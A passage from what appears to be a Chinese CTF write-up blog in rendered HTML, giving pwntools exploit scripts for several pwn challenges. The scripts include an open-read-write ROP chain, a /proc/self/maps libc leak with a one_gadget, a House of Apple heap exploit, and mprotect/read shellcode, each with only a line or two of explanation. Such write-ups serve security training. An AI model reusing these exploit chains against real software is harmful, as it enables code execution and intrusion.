punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'openat'</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_base<span class="token punctuation">)</span>orw_rop <span class="token operator">+=</span> p64<span class="token punctuation">(</span>rdi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>rsi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>code<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>rdx<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_base<span class="token punctuation">)</span>orw_rop <span class="token operator">+=</span> p64<span class="token punctuation">(</span>rdi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>rsi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>code<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>rdx<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_base<span class="token punctuation">)</span>orw_rop <span class="token operator">+=</span> <span class="token string">b'/flag'</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x8</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span>p <span class="token operator">=</span> orw_rop<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>stack_addr <span class="token operator">-</span> <span class="token number">0x8</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>leave_ret<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'pwn'</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="QWEN"><a href="#QWEN" class="headerlink" title="QWEN"></a>QWEN</h2><p>当输入的位置越界之后会调用<code>a1</code>，所以先赢了游戏之后覆盖<code>a1</code>为<code>backdoor</code>，可以有限制的读文件，读<code>/proc/self/maps</code>泄露<code>libc</code>地址之后打<code>ogg</code>，直接打会失败，先返回到<code>main</code>重新运行再打<code>ogg</code>平衡栈，远程用<code>pwn2</code>压缩<code>flag</code>直接<code>cat</code>拿到<code>flag</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'splitw'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>debug <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"pwn-c9c758156e.challenge.xctf.org.cn"</span><span class="token punctuation">,</span> <span class="token number">9999</span><span class="token punctuation">,</span> ssl<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">game</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'0 0'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'0 1'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'0 2'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'0 3'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'0 4'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'say?'</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'game'</span><span class="token punctuation">,</span> <span class="token string">'N'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'15 15'</span><span class="token punctuation">)</span>bd <span class="token operator">=</span> <span class="token number">0x1508</span>p1 <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x8</span> <span class="token operator">+</span> p16<span class="token punctuation">(</span>bd<span class="token punctuation">)</span>game<span class="token punctuation">(</span>p1<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'key'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">0x6b8b4567</span><span class="token punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'logged'</span><span class="token punctuation">,</span> <span class="token string">b'/proc/self/maps'</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\n'</span><span class="token punctuation">)</span>code_base <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>start <span class="token operator">=</span> code_base <span class="token operator">+</span> <span class="token number">0x9E0</span>main_addr <span class="token operator">=</span> code_base <span class="token operator">+</span> <span class="token number">0x17B3</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\n'</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./2.27/libc.so.6'</span><span class="token punctuation">)</span>ogg <span class="token operator">=</span> <span class="token number">0x10a2fc</span> <span class="token operator">+</span> libc_basep1 <span class="token operator">=</span> p64<span class="token punctuation">(</span>main_addr<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">6</span>game<span class="token punctuation">(</span>p1<span class="token punctuation">)</span>p1 <span class="token operator">=</span> <span class="token string">b'\x00'</span> <span class="token operator">*</span> <span class="token number">0x8</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>ogg<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">4</span>game<span class="token punctuation">(</span>p1<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="guest-book"><a href="#guest-book" class="headerlink" title="guest book"></a>guest book</h2><p>直接套<code>large bin</code>的<code>hosue of apple</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'splitw'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>debug <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"pwn-f29b87ed3e.challenge.xctf.org.cn"</span><span class="token punctuation">,</span> <span class="token number">9999</span><span class="token punctuation">,</span> ssl<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_libc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'>'</span><span class="token punctuation">,</span> <span class="token string">b'1'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'index'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'size'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'>'</span><span class="token punctuation">,</span> <span class="token string">b'2'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'index'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'content'</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'>'</span><span class="token punctuation">,</span> <span class="token string">b'3'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'index'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'>'</span><span class="token punctuation">,</span> <span class="token string">b'4'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'index'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'>'</span><span class="token punctuation">,</span> <span class="token string">b'5'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x540</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0x520</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0x530</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./2.35/libc.so.6'</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x21ace0</span>add<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">0x550</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x17</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x17</span> <span class="token operator">+</span> <span class="token string">b'\n'</span><span class="token punctuation">)</span>heap_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x290</span>_IO_list_all <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'_IO_list_all'</span><span class="token punctuation">]</span>_IO_wfile_jumps <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'_IO_wfile_jumps'</span><span class="token punctuation">]</span>leave_ret <span class="token operator">=</span> <span class="token number">0x0000000000114723</span> <span class="token operator">+</span> libc_baseone <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x50a47</span><span class="token punctuation">,</span> <span class="token number">0xebc81</span><span class="token punctuation">,</span> <span class="token number">0xebc85</span><span class="token punctuation">,</span> <span class="token number">0xebc88</span><span class="token punctuation">,</span> <span class="token number">0xebce2</span><span class="token punctuation">,</span> <span class="token number">0xebd3f</span><span class="token punctuation">,</span> <span class="token number">0xebd43</span><span class="token punctuation">]</span>one_gadget <span class="token operator">=</span> one<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_basedelete<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>p1 <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>leave_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>heap_base <span class="token operator">+</span> <span class="token number">0x290</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>_IO_list_all <span class="token operator">-</span> <span class="token number">0x20</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> p1<span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">0x550</span><span class="token punctuation">)</span>heap_addr <span class="token operator">=</span> heap_base <span class="token operator">+</span> <span class="token number">0x550</span> <span class="token operator">+</span> <span class="token number">0x530</span> <span class="token operator">+</span> <span class="token number">0x290</span>setcontext <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'setcontext'</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">61</span>target_addr <span class="token operator">=</span> heap_base <span class="token operator">+</span> <span class="token number">0x550</span> <span class="token operator">+</span> <span class="token number">0x530</span> <span class="token operator">+</span> <span class="token number">0x290</span>p2 <span class="token operator">=</span> <span class="token string">b'\x00'</span>p2 <span class="token operator">=</span> p2<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>p2 <span class="token operator">=</span> p2<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x90</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>heap_addr <span class="token operator">+</span> <span class="token number">0xe0</span><span class="token punctuation">)</span>p2 <span class="token operator">=</span> p2<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0xc8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>_IO_wfile_jumps<span class="token punctuation">)</span>p2 <span class="token operator">=</span> p2<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0xd0</span> <span class="token operator">+</span> <span class="token number">0xe0</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>target_addr <span class="token operator">+</span> <span class="token number">0xe0</span> <span class="token operator">+</span> <span class="token number">0xe8</span><span class="token punctuation">)</span>p2 <span class="token operator">=</span> p2<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0xd0</span> <span class="token operator">+</span> <span class="token number">0xe8</span> <span class="token operator">+</span> <span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>one_gadget<span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> p2<span class="token punctuation">)</span>exit<span class="token punctuation">(</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="ezcode"><a href="#ezcode" class="headerlink" title="ezcode"></a>ezcode</h2><p><code>json</code>构造一次<code>mprotect</code>和<code>read</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> jsoncontext<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'splitw'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>debug <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"pwn-ff73d874f7.challenge.xctf.org.cn"</span><span class="token punctuation">,</span> <span class="token number">9999</span><span class="token punctuation">,</span> ssl<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_libc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''mov ax, 10shl edi, 12mov dx, 0x7syscall'''</span>shellcode <span class="token operator">=</span> <span class="token string">b'66 b8 0a 00 c1 e7 0c 66 ba 07 00 0f 05'</span><span class="token triple-quoted-string string">'''cdqmov esi, edixor eax, eaxxor edi, edisyscall'''</span>shellcode <span class="token operator">+=</span> <span class="token string">b'99 89 fe 31 c0 31 ff 0f 05 '</span>shellcode <span class="token operator">=</span> shellcode<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">b" "</span><span class="token punctuation">,</span> <span class="token string">b""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x2b</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>li<span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">"shellcode"</span><span class="token punctuation">:</span> shellcode<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span>json_string <span class="token operator">=</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>data<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'input'</span><span class="token punctuation">,</span> json_string<span class="token punctuation">)</span>shellcode_orw <span class="token operator">=</span> asm<span class="token punctuation">(</span><span class="token triple-quoted-string string">'''push 0x67616c66mov rdi,rspxor esi,esipush 2pop raxsyscallmov rdi,raxmov rsi,rspmov edx,0x100xor eax,eaxsyscallmov edi,1mov rsi,rsppush 1pop raxsyscall'''</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b'\x90'</span><span class="token operator">*</span><span class="token number">0xff</span><span class="token operator">+</span>asm<span class="token punctuation">(</span><span class="token string">"shl rsp, 12; add rsp, 0x500;"</span><span class="token punctuation">)</span><span class="token operator">+</span>shellcode_orw<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" 